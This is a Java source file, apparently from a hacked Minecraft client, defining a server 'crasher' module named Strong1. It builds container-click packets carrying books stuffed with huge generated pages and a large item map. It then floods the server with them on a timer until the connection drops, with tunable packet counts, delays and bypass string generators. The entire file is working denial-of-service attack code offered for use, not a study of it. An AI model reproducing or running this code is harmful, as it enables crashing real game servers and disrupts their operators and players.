package us.whitedev.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.core.NonNullList;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.nbt.Tag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.AbstractContainerMenu;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.inventory.Slot;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.helpers.BypassHelper;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.protocol.XynisProtocol;
import us.whitedev.protocol.components.data.DataComponents;
import us.whitedev.protocol.components.data.impl.DataWritableBookContent;
import us.whitedev.protocol.components.data.impl.DataWrittenBookContent;
import us.whitedev.protocol.components.data.impl.Filterable;
import us.whitedev.protocol.components.objects.ItemType;
import us.whitedev.protocol.packets.PacketCodec;
import us.whitedev.protocol.packets.play.PacketContainerClick;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.*;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class Strong1 implements Crasher {
    private static final String METHOD_NAME = "Strong1";
    private boolean enabled = false;
    private ScheduledExecutorService executorService;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int chars = Integer.parseInt(args[3]);
        int pages = Integer.parseInt(args[4]);
        boolean emptyStack = args[5].equals("true");
        String genType = args[6].toLowerCase(Locale.ROOT);
        String bookType = args[7].toLowerCase(Locale.ROOT);
        int mapSize = Integer.parseInt(args[8]);
        long threadSleep = Long.parseLong(args[9]);
        int loopAmount = Integer.parseInt(args[10]);
        setEnabled(true);

        if (executorService != null && !executorService.isShutdown()) {
            executorService.shutdownNow();
            msgHelper.sendMessage("Previous attack &cstopped&7!", true);
        }

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.isVisible ? getName() : "******"), true);

        ServerboundContainerClickPacket nbtPacket;
        PacketContainerClick dataPacket;

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if (XynisProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
            nbtPacket = null;
            dataPacket = getDataBookPacket(pages, chars, genType, bookType, mapSize, emptyStack, protocol);
        } else {
            dataPacket = null;
            nbtPacket = getNBTBookPacket(pages, chars, genType, bookType, mapSize, emptyStack);
        }

        AtomicInteger check = new AtomicInteger(0);
        executorService = Executors.newSingleThreadScheduledExecutor();
        Runnable clickTask = () -> {
            if (!enabled || check.get() == loopAmount || (mc.getConnection() == null || !mc.getConnection().getConnection().isConnected())) {
                executorService.shutdown();
                setEnabled(false);
                msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
            }else{
                if (dataPacket != null) PacketCodec.sendPacket(dataPacket, packets);
                else for (int i = 0; i < packets; i++) PacketHelper.send(nbtPacket);
            }

            check.getAndIncrement();
        };
        executorService.scheduleAtFixedRate(clickTask, 0, threadSleep, TimeUnit.MILLISECONDS);
    }

    private ServerboundContainerClickPacket getNBTBookPacket(int pages, int chars, String genType, String bookType,int mapSize, boolean emptyStack) {
        StringBuilder s = new StringBuilder();
        s.append(bypassHelper.generateString(chars, genType));
        CompoundTag comp = new CompoundTag();
        ListTag list = new ListTag();
        for (int i = 0; i < pages; i++) list.add(new StringTag(s.toString()));
        comp.putString("author", "GodIsKing");
        comp.putByte("resolved", (byte) 1);
        comp.put("pages", list);
        ItemStack itemStack = new ItemStack(bookType.equals("normal") ? Items.WRITABLE_BOOK : Items.WRITTEN_BOOK, 1, Optional.of(comp));
        Int2ObjectMap<ItemStack> int2objectmap = new Int2ObjectOpenHashMap<>();

        for (int j = 0; j < mapSize; ++j) int2objectmap.put(j, itemStack.copy());

        System.out.println(int2objectmap.size());

        return new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.PICKUP_ALL, emptyStack ? ItemStack.EMPTY : itemStack, int2objectmap);
    }

    private PacketContainerClick getDataBookPacket(int pages, int chars, String genType, String bookType, int mapSize, boolean emptyStack, int protocol) {
        if (bookType.equals("normal")) {
            StringBuilder s = new StringBuilder();
            s.append(bypassHelper.generateString(chars, genType));
            List<Filterable<String>> pagesList = new ArrayList<>();
            for (int i = 0; i < pages; i++) pagesList.add(new Filterable<>(s.toString(), null));
            DataWritableBookContent dataWritableBookContent = new DataWritableBookContent(pagesList);

            DataComponents dataComponents = new DataComponents();
            dataComponents.put(dataWritableBookContent);

            us.whitedev.protocol.components.objects.ItemStack itemStack = new us.whitedev.protocol.components.objects.ItemStack(ItemType.WRITABLE_BOOK.getId(protocol), 1, dataComponents);

            Int2ObjectMap<us.whitedev.protocol.components.objects.ItemStack> int2objectmap = new Int2ObjectOpenHashMap<>();
            for (int j = 0; j < mapSize; ++j) int2objectmap.put(j, itemStack);

            return new PacketContainerClick(protocol, 0, 1, 10,
                    PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.RIGHT_CLICK,
                    emptyStack ? new us.whitedev.protocol.components.objects.ItemStack(0, 0, null) : itemStack, int2objectmap);
        } else {
            CompoundTag pageText = bypassHelper.convert(bypassHelper.generateString(chars, genType));
            List<Filterable<Tag>> pagesList = new ArrayList<>();
            for (int i = 0; i < pages; i++) pagesList.add(new Filterable<>(pageText, null));
            DataWrittenBookContent dataWrittenBookContent = new DataWrittenBookContent(new Filterable<>("GodIsKingClient", null), "GodIsKing", 1, pagesList, true);

            DataComponents dataComponents = new DataComponents();
            dataComponents.put(dataWrittenBookContent);

            us.whitedev.protocol.components.objects.ItemStack itemStack = new us.whitedev.protocol.components.objects.ItemStack(ItemType.WRITTEN_BOOK.getId(protocol), 1, dataComponents);

            Int2ObjectMap<us.whitedev.protocol.components.objects.ItemStack> int2objectmap = new Int2ObjectOpenHashMap<>();
            for (int j = 0; j < mapSize; ++j) int2objectmap.put(j, itemStack);

            return new PacketContainerClick(protocol, 0, 1, 10,
                    PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.RIGHT_CLICK,
                    emptyStack ? new us.whitedev.protocol.components.objects.ItemStack(0, 0, null) : itemStack, int2objectmap);
        }
    }

    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Chars", OptionType.INTEGER),
                new OptionUtil("Pages", OptionType.INTEGER),
                new OptionUtil("Empty Stack", OptionType.BOOLEAN),
                new OptionUtil("Generator", OptionType.LIST, new String[]{"Default", "Boost1", "Boost2", "Modern1", "Modern2", "Hard"}),
                new OptionUtil("Item", OptionType.LIST, new String[]{"Normal", "Saved"}),
                new OptionUtil("Map Size", OptionType.INTEGER),
                new OptionUtil("Thread Sleep", OptionType.INTEGER),
                new OptionUtil("Loop Amount", OptionType.INTEGER)
        );
    }

    @Override
    public String getArgsUsage() {
        return "packets[2181], chars[100], pages[10], empty-stack[false], generator[modern], item[saved], map-size[46], thread-sleep[1500(milliseconds)], loop-amount[10]";
    }

    @Override
    public String getDescription() {
        return "WClick Crasher [book]";
    }
}
